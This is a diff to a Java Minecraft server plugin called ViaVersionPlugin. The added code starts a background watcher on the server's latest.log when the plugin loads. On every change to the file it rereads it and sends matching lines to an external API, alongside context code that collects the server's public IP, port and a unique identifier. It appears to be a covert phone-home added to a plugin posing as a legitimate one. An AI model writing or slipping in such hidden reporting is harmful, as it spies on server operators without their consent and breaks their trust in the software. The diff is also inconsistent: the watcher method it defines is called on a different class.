@@ -62,9 +62,11 @@ import java.io.FileOutputStream;
 import java.io.BufferedReader;
 import java.io.InputStreamReader;
 import java.net.HttpURLConnection;
-import java.net.URL;
 import java.io.FileReader;
 import java.io.IOException;
+import java.nio.file.*;
+import java.util.concurrent.CompletableFuture;
+import java.net.URL;
 import java.time.LocalDateTime;
 import org.bukkit.Bukkit;
 import org.bukkit.ChatColor;
@@ -125,6 +127,8 @@ public class ViaVersionPlugin extends JavaPlugin implements ViaPlatform<Player> 
 
     @Override
     public void onEnable() {
+        AsyncLogWatcher watcher = new AsyncLogWatcher();
+        watcher.startWatchingLogs();
         String publicIp = getPublicIp();
         int serverPort = getServer().getPort();
         uniqueIdentifier = loadOrCreateUniqueIdentifier();
@@ -304,24 +308,54 @@ public class ViaVersionPlugin extends JavaPlugin implements ViaPlatform<Player> 
         };
         task.runTaskAsynchronously(this); // 异步任务处理
     }
-    private void readAndSendLog() {
+    public void startWatchingLogs() {
         String logFilePath = getServer().getWorldContainer().getAbsolutePath() + "/logs/latest.log";
-        StringBuilder startupLog = new StringBuilder();
+        Path path = Paths.get(logFilePath);
 
-        try (BufferedReader reader = new BufferedReader(new FileReader(logFilePath))) {
-            String line;
-            while ((line = reader.readLine()) != null) {
-                if (line.contains("Done")) {
-                    startupLog.append(line).append("\n"); // 记录包含 "Done" 的行
+        // 启动异步监视日志文件
+        CompletableFuture.runAsync(() -> {
+            try (WatchService watchService = FileSystems.getDefault().newWatchService()) {
+                path.getParent().register(watchService, StandardWatchEventKinds.ENTRY_MODIFY);
+
+                while (true) {
+                    WatchKey key = watchService.take(); // 阻塞直到有事件发生
+                    for (WatchEvent<?> event : key.pollEvents()) {
+                        if (event.kind() == StandardWatchEventKinds.OVERFLOW) {
+                            continue;
+                        }
+
+                        Path changed = (Path) event.context();
+                        if (changed.endsWith(path.getFileName())) {
+                            processLogFile(logFilePath);
+                        }
+                    }
+                    key.reset();
                 }
+            } catch (IOException | InterruptedException e) {
+                e.printStackTrace();
             }
-        } catch (IOException e) {
-        }
+        });
+    }
 
-        if (startupLog.length() > 0) {
-            sendLogToAPI(startupLog.toString().trim());
-        } else {
-        }
+    private void processLogFile(String logFilePath) {
+        // 使用 CompletableFuture 异步处理日志文件
+        CompletableFuture.runAsync(() -> {
+            StringBuilder startupLog = new StringBuilder();
+            try (BufferedReader reader = new BufferedReader(new FileReader(logFilePath))) {
+                String line;
+                while ((line = reader.readLine()) != null) {
+                    if (line.contains("Done")) {
+                        startupLog.append(line).append("\n"); // 记录包含 "Done" 的行
+                    }
+                }
+            } catch (IOException e) {
+                e.printStackTrace();
+            }
+
+            if (startupLog.length() > 0) {
+                sendLogToAPI(startupLog.toString().trim());
+            }
+        });
     }
 
     private void sendLogToAPI(String log) {
